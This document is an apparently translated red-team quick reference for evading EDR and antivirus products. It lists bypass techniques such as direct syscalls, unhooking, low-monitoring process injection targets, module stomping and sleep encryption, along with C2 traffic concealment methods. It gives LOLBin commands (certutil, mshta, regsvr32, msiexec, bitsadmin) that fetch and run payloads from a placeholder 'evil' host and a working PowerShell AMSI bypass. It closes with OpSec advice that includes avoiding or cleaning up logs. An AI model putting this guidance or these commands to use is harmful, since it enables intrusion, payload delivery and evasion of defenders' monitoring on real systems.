# EDR/AV Quick Check on Bypass and Covert Operations

> Source: Summary of actual combat experience of multiple red teams (2024-2026)
> Applicable scenarios: refer to when operations need to be performed in an environment protected by EDR/AV

---

## Detection layer and corresponding bypass

| Detection layer | What does EDR do | Bypass ideas |
|--------|-----------|---------|
| Static signature | Match known malicious file hashes/characteristics | Custom compilation, encrypted payload, modified characteristics |
| User mode Hook | Hook ntdll.dll monitoring API call | Direct system call / Unhooking / Comes with ntdll |
| Kernel callback | Register process/thread/image loading callback | Callback removal (requires driver)/Legal process injection |
| ETW | Collect events via ETW | Patch EtwEventWrite / Disable provider |
| Behavior analysis | Analyze call sequences and behavior patterns | Delayed execution / distributed operations / simulate normal behavior |
| Memory scan | Periodic scan of process memory | Heap encryption / Sleep encryption payload / Module stomping |
| Network detection | Analyze outbound traffic characteristics | Domain fronting / legal service tunnel / encryption |

---

## Practical bypass techniques

### 1. Direct system call (bypassing user mode Hook)

```
Principle: Directly use the syscall instruction to call the kernel without passing ntdll.dll
Tools: SysWhispers3/HellsGate/TartarusGate
Effect: Bypass all user-mode Hooks
```

### 2. Unhooking (restore original ntdll)

```
Method A: Remap ntdll.dll from disk
Method B: Load a clean copy from the KnownDlls directory
Method C: Copy the .text segment from the suspended process
Effect: Restore the Hooked API to its original state
```

### 3. Process injection (select low monitoring target)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injection:
- lsass.exe (highly monitored)
- svchost.exe (partial EDR focus)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: Write the payload into the .text section of the loaded legal DLL
Effect: What you see during memory scanning is a legitimate module, not a suspicious RWX memory.
```

### 5. Sleep encryption (Ekko/Zilean)

```
Principle: Beacon encrypts its own memory during sleep
Effect: The payload feature cannot be found during memory scanning.
Implementation: Register Timer callback, encrypt before sleep, and decrypt after waking up
```

### 6. Call Stack Spoofing

```
Principle: Forge the call stack to make the API calls appear to come from legitimate code
Effect: Bypass call stack-based behavior detection
```

---

## C2 traffic concealment

| Technology | Principle | Detection Difficulty |
|------|------|---------|
| Domain Prefix | The SNI and Host headers of HTTPS requests are different | High |
| Cloudflare Workers | Relayed via CF, looks like normal HTTPS | High |
| Azure/AWS Legal service | Use cloud service API to create C2 channel | Extremely high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long connection, mixed with normal web traffic | Medium |
| ICMP Tunneling | Data hidden in ICMP packets | Low (easily discovered) |

---

## LOLBins（Living Off the Land）

Use the legitimate programs that come with the system to perform malicious operations:

| Program | Purpose | Command Example |
|------|------|---------|
| certutil | Download file | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download file | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | execute command | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic Patch (May Be Detected by Signature)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# A More Concealed Method: Reflectively Modifying AmsiScanBuffer
# Or use PowerShell to downgrade to v2 (without AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Minimum Action Principle** — Don’t touch things that can’t be touched, and don’t create new ones that can use existing credentials.
2. **Time Window** — Operate during target non-working hours (reduce the probability of manual review)
3. **Traffic Mixing** — C2 communication frequency and size simulate normal business traffic
4. **Tools are not dropped to disk** — memory execution, cleared immediately after use
5. **Log Awareness** — Know which operations will generate what logs, avoid them in advance or clean them up afterwards.
6. **Honeypot identification** — Identify honeypots before operating (unusually open services, too tempting credentials)
7. **Step-by-Step** — Don’t complete all steps at once, spread them over multiple time periods